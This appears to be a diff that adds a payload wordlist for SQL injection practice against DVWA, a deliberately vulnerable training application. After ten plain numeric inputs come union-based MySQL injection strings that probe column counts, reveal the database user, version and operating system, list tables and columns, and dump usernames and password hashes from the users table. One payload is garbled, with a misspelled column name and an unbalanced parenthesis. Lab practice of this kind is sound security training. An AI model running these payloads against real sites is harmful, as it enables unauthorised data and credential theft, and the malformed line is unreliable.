@@ -1,0 +1,21 @@
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+1' order by 1 #
+1' order by 2 #
+1' order by 3 #
+1' order by 4 #
+1' order by 5 #
+1' order by 6 #
+1' union select null,concat_ws(char(32,58,32),user(),database(),version())#
+1' union select 1,@@global.version_compile_os from mysql.user #
+1' union select null,group_concat(table_name) from information_schema.tables where table_schema='dvwa' #
+1' union select null,group_concat(colume_name0 from information_schema.columns where table_schema='dvwa' and table_name='users' #
+1' union select null,group_concat(concat_ws(char(32,58,32),user,password)) from users # 
